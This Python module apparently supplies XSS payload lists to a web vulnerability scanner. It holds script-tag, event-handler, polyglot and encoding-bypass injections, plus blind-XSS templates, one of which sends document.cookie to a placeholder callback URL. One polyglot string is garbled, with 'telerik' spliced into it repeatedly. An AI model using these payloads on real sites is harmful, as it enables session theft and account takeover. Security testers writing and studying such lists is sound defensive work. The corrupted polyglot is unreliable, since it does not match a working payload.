"""XSS payloads — polyglots, event handlers, encoding bypasses, blind XSS."""

# Classic reflected/stored XSS payloads
BASIC: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
]

# Polyglot payloads that work across multiple contexts
POLYGLOTS: list[str] = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/telerik>",
    '"><img src=x onerror=alert(1)>//',
    "javascript:alert(1)//",
    '"><svg/onload=alert(1)>',
    "{{constructor.constructor('alert(1)')()}}",
]

# Event handler based
EVENT_HANDLERS: list[str] = [
    '" onfocus="alert(1)" autofocus="',
    '" onmouseover="alert(1)" style="position:fixed;left:0;top:0;width:100%;height:100%"',
    "' onfocus='alert(1)' autofocus='",
    '" onload="alert(1)"',
    "' onerror='alert(1)'",
]

# Encoding bypass payloads
ENCODING_BYPASS: list[str] = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<<SCRIPT>alert(1)//<</SCRIPT>",
]

# DOM-based XSS canary payloads (for browser verification)
DOM_CANARY: list[str] = [
    '<img src=x onerror="window.__xss_fired=true">',
    '<svg onload="window.__xss_fired=true">',
]

# Blind XSS — inject OOB callback (template: replace CALLBACK_URL)
BLIND_TEMPLATES: list[str] = [
    '"><img src=CALLBACK_URL>',
    "<script src=CALLBACK_URL></script>",
    '"><script>new Image().src="CALLBACK_URL?c="+document.cookie</script>',
    '"><iframe src=CALLBACK_URL>',
]

# All payloads combined (for default usage)
ALL: list[str] = BASIC + POLYGLOTS + EVENT_HANDLERS + ENCODING_BYPASS + DOM_CANARY
